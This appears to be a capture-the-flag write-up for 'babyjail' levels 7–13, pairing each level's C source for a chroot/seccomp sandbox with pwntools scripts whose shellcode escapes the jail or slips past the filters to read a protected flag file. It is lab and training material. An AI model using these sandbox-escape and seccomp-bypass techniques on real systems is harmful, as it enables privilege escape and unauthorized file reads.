    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    assert(argc > 1);

    puts("Checking to make sure you're not trying to open the flag.\n");
    assert(strstr(argv[1], "flag") == NULL);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "chdir", SCMP_SYS(chdir));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(chdir), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "chroot", SCMP_SYS(chroot));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(chroot), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "mkdir", SCMP_SYS(mkdir));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mkdir), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "open", SCMP_SYS(open));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "write", SCMP_SYS(write));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "sendfile", SCMP_SYS(sendfile));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```


## Approach

```
mkdir a
chroot(a)
open('/flag', 0)
sendfile(1, 3, 0, 100)
```

## Script

solve.py

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('/challenge/babyjail_level7', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
b *main
"""

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)


shellcode = asm("""
xor rax, rax
mov al, 0x53
lea rdi, [rip +dir]
mov rsi, 0777
syscall

xor rax, rax
mov al, 0xa1
lea rdi, [rip +dir]
syscall

xor rax, rax
mov al, 0x2
lea rdi, [rip + flag]
xor rsi, rsi
xor rdx, rdx
syscall

mov rsi, rax
xor rax, rax
mov al, 0x28
xor rdi, rdi
mov dil, 0x1
xor rdx, rdx
mov r10, 0x64
syscall

dir:
        .string "temp"
flag:
        .string "../../flag"

""", arch = 'amd64', os ='linux')

def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process(['/challenge/babyjail_level7', '/'])

io = start()
io.sendlineafter(b'Reading 0x1000 bytes of shellcode from stdin.\n', shellcode)
io.interactive()
```


# Babyjail_level8

## Overall

***babyjail_level8.c***

```cpp
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this");
    puts("jail, not the real flag file outside of it. If you want the real flag, you must escape.\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    char jail_path[] = "/tmp/jail-XXXXXX";
    assert(mkdtemp(jail_path) != NULL);

    printf("Creating a jail at `%s`.\n", jail_path);

    assert(chroot(jail_path) == 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "openat", SCMP_SYS(openat));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "write", SCMP_SYS(write));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "sendfile", SCMP_SYS(sendfile));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sendfile), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
```


## Approach
File challenge doesn't have any open() function, so make it open outside.

```
3</
```

## Script

solve.py


```python
#!/usr/bi/env python3
from pwn import *
import os
context.log_level = 'debug'
context.binary = elf = ELF('/challenge/babyjail_level8', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
b *main
"""

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)



shellcode = asm("""
        xor rax, rax
        mov eax, 0x101
        xor rdi, rdi
        mov dil, 0x3
        lea rsi, [rip+flag]
        mov rdx, 0
        syscall
        
        mov rsi, rax
        xor rax, rax
        mov al, 0x28
        xor rdi, rdi
        mov dil, 1
        xor rdx, rdx
        mov r10, 100
        syscall
flag:
    .asciz "flag"
""", arch = 'amd64', os ='linux')

def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process('exec 3</ ; /challenge/babyjail_level8', close_fds=False, shell=True)

io = start()
io.sendlineafter(b'Reading 0x1000 bytes of shellcode from stdin.\n', shellcode)
io.interactive()
```


# Babyjail_level9

## Overall

***babyjail_level9.c***


```cpp
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: allow).\n");
    ctx = seccomp_init(SCMP_ACT_ALLOW);
    for (int i = 0; i < 512; i++)
    {
        switch (i)
        {
        case SCMP_SYS(close):
            printf("Allowing syscall: %s (number %i).\n", "close", SCMP_SYS(close));
            continue;
        case SCMP_SYS(stat):
            printf("Allowing syscall: %s (number %i).\n", "stat", SCMP_SYS(stat));
            continue;
        case SCMP_SYS(fstat):
            printf("Allowing syscall: %s (number %i).\n", "fstat", SCMP_SYS(fstat));
            continue;
        case SCMP_SYS(lstat):
            printf("Allowing syscall: %s (number %i).\n", "lstat", SCMP_SYS(lstat));
            continue;
        }
        assert(seccomp_rule_add(ctx, SCMP_ACT_KILL, i, 0) == 0);
    }

    puts("Adding architecture to seccomp filter: x86_32.\n");
    seccomp_arch_add(ctx, SCMP_ARCH_X86);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```


## Approach

```
Shellcode for arch x86_32
```

## Script

solve.py

```python
#!/usr/bin/env python3
from pwn import *
import os
context.log_level = 'debug'
context.binary = elf = ELF('/challenge/babyjail_level9', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
b *main
"""

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)



shellcode = asm("""
    lea ebx, [eip+flag]
    xor ecx, ecx
    xor edx, edx
    mov eax, 5
    int 0x80

    mov ebx, eax
    mov ecx, 0x1337200
    mov edx, 0x64
    mov eax, 3
    int 0x80

    mov ebx, 1
    mov ecx, 0x1337200
    mov edx, 0x64
    mov eax, 4
    int 0x80

flag:
    .asciz "/flag"

""", arch = 'amd64', os ='linux')

def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process('/challenge/babyjail_level9', env={"LD_PRELOAD": libc.path})

io = start()
io.sendlineafter(b'Reading 0x1000 bytes of shellcode from stdin.\n', shellcode)
io.interactive()
```


# Babyjail_level10

## Overall

***babyjail_level10.c***

```cpp
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("You may open a specified file, as given by the first argument to the program (argv[1]).\n");

    puts("You may upload custom shellcode to do whatever you want.\n");

    puts("For extra security, this challenge will only allow certain system calls!\n");

    assert(argc > 1);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);
    if (fd < 0)
        printf("Failed to open the file located at `%s`.\n", argv[1]);
    else
        printf("Successfully opened the file located at `%s`.\n", argv[1]);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);
    printf("Mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

    puts("Reading 0x1000 bytes of shellcode from stdin.\n");
    int shellcode_size = read(0, shellcode, 0x1000);

    puts("This challenge is about to execute the following shellcode:\n");
    print_disassembly(shellcode, shellcode_size);
    puts("");

    scmp_filter_ctx ctx;

    puts("Restricting system calls (default: kill).\n");
    ctx = seccomp_init(SCMP_ACT_KILL);
    printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    printf("Allowing syscall: %s (number %i).\n", "exit", SCMP_SYS(exit));
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0) == 0);

    puts("Executing shellcode!\n");

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

## Approach

```
I will:
Read the flag and store it somewhere.
- Guess each byte in the flag.
- If byte guess smaller than byte at this index in flag. - Then loop forever. Otherwise, the shellcode will exit.
- Capture the signal and use an algorithmic binary search to speed up guessing.
```

## Script

solve.py

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
context.binary = elf = ELF('/challenge/babyjail_level10' , checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
b *main
b *main+830
c
c
si
si
si
si
si
si
si
si
si
si
si
"""

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)



def start():
    if args.GDB:
        return gdb.debug([elf.path, '/flag'], env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process([elf.path, '/flag'])


flag = ''
index = 0
guess = 0

while True:
    l=0x1d
    r=0x7f
    while l + 1 != r:
        io = start()
        io.timeout = 0.5
        guess = (l+r) // 2
        info("guesss: " + chr(guess) + " " + str(guess))
        shellcode = asm(f'''
        xor rax, rax
        xor rdi, rdi
        mov dil, 0x3
        mov rsi, rsp
        xor rdx, rdx
        mov dl, 0x64
        syscall

        mov rdi, rsp
        add rdi, {index}
        mov al, {guess}
        cmp al, byte ptr [rdi]
        jl LOOP

        xor rax, rax
        mov al, 0x3c
        xor rdi, rdi
        mov dil, 0x1
        syscall

        LOOP:
            jmp LOOP
        ''', arch = 'amd64', os ='linux')
        io.sendlineafter(b'Reading 0x1000 bytes of shellcode from stdin.\n', shellcode)

        if(io.poll(block=True)):
            print("EXIT: guess greater or equal flag")
            r =guess
            io.close()
        else:
            print("TIMEOUT: guess smaller than flag")
            l = guess
            io.close()


    flag += chr(r)

    print("\t\t\t\t FLAG: + " + chr(r))

    if flag[index]=='}':
        break

    index += 1

info("[*] FLAG: " + flag)
```


# Babyjail_level11

It is totally similar to level 10

# Babyjail_level12

It is totally similar to level 10

# Babyjail_level13

## Overall


***babyjail_level13.c***

```cpp
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

int child_pid;

void cleanup(int signal)
{
    puts("Time is up: terminating the child and parent!\n");
    kill(child_pid, 9);
    kill(getpid(), 9);
}

int main(int argc, char **argv, char **envp)
{
    assert(argc > 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 1);

    puts("This challenge will fork into a jail. Inside of the child process' jail, you will only be able to communicate with the");
    puts("parent process. If you want the flag, you must convince the parent process to give it to you.\n");
    for (int i = 3; i < 10000; i++) close(i);

    puts("Creating a `socketpair` that the child and parent will use to communicate. This is a pair of file descriptors that are");
    puts("connected: data written to one can be read from the other, and vice-versa.\n");
    int file_descriptors[2];
    assert(socketpair(AF_UNIX, SOCK_STREAM, 0, file_descriptors) == 0);
    int parent_socket = file_descriptors[0];
    int child_socket = file_descriptors[1];

    printf("The parent side of the socketpair is FD %d.\n", parent_socket);
    printf("The child side of the socketpair is FD %d.\n", child_socket);

    puts("Registering a cleanup function that will run 1 second from now and terminate both the parent and child.\n");
    alarm(1);
    signal(SIGALRM, cleanup);

    puts("Forking into a parent and child (sandbox) process.\n");
    child_pid = fork();
    if (!child_pid)
    {
        puts("The child will now close itself off from the world, except for the child side of the socketpair.\n");
        close(0);
        close(1);
        close(2);
        close(parent_socket);

        void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
        assert(shellcode == (void *)0x1337000);
        printf("The child mapped 0x1000 bytes for shellcode at %p!\n", shellcode);

        scmp_filter_ctx ctx;

        puts("Restricting system calls (default: kill).\n");
        ctx = seccomp_init(SCMP_ACT_KILL);
        printf("Allowing syscall: %s (number %i).\n", "read", SCMP_SYS(read));
        assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
        printf("Allowing syscall: %s (number %i).\n", "write", SCMP_SYS(write));
        assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0) == 0);
        printf("Allowing syscall: %s (number %i).\n", "exit", SCMP_SYS(exit));
        assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0) == 0);

        assert(seccomp_load(ctx) == 0);

        read(child_socket, shellcode, 0x1000);

        write(child_socket, "print_msg:Executing shellcode!", 128);

        ((void(*)())shellcode)();
    }

    else
    {
        puts("The parent is reading 0x1000 bytes of shellcode from stdin.\n");
        char shellcode[0x1000];
        read(0, shellcode, 0x1000);

        puts("The parent is sending the shellcode to the child.\n");
        write(parent_socket, shellcode, 0x1000);

        while (true)
        {
            char command[128] = { 0 };

            puts("The parent is waiting for a command from the child.\n");
            int command_size = read(parent_socket, command, 128);
            command[9] = '\0';

            char *command_argument = &command[10];
            int command_argument_size = command_size - 10;

            printf("The parent received command `%.10s` with an argument of %d bytes from the child.\n", command, command_argument_size);

            if (strcmp(command, "print_msg") == 0)
            {
                puts(command_argument);
            }
            else if (strcmp(command, "read_file") == 0)
            {
                sendfile(parent_socket, open(command_argument, 0), 0, 128);
            }
            else
            {
                puts("Error: unknown command!\n");
                break;
            }
        }
    }
}
```



This challenge requires writing shellcode to interact between the parent process and the childrend process. You must create a shellcode to give the instructions for parent process running.

## Approach

***print_msg***
```cpp
puts(command_argument);
```

***read_file***
```cpp
sendfile(parent_socket, open(command_argument, 0), 0, 128);
```
- As you see, the content of file will send to parent_socket(child process). 

***Solution***

```
Shellcode will run:
- Pass the agrument: /flag for read_file
- Wait for content of /flag from parent process
- print_msg to get the flag.
```


## Script

solve.py

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
context.binary = elf = ELF('/challenge/babyjail_level13' , checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
set follow-fork-mode parent
handle SIGALRM ignore
b *main
b *main+1144

b *main+1439
b *main+1540
b *main+1586


b *main+1615
b *main+1640

b *main+1650
"""

def info(mess):
    return log.info(mess)

def success(mess):
    return log.success(mess)

def error(mess):
    log.error(mess)



def start():
    if args.GDB:
        return gdb.debug([elf.path], env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('', )
    else:
        return process([elf.path])


shellcode = asm("""
xor rax, rax
mov al, 0x1
lea rsi, [rip + read_file]
xor rdx, rdx
mov dl, 15
xor rdi, rdi
mov dil, 0x4
syscall

jmp loop

loop:
    xor rax, rax
    mov rdi, 0x4
    mov rsi, rsp
    add rsi, 8
    mov rdx, 0x64
    syscall
    cmp rax, 0
    jl loop

    xor rax, rax
    mov al, 0x1
    lea rsi, [rip + msg]
    xor rdx, rdx
    mov dl, 10
    xor rdi, rdi
    mov dil, 0x4
    syscall

    mov rax, 0x1
    mov rdi, 0x4
    mov rsi, rsp
    add rsi,8
    mov rdx, 0x64
    syscall
    ret

msg:
    .asciz "print_msg"
read_file:
    .asciz "read_file /flag"
""", arch = 'amd64', os ='linux')

io = start()
io.sendlineafter(b'The child will now close itself off from the world, except for the child side of the socketpair.\n', shellcode)

io.interactive()
```
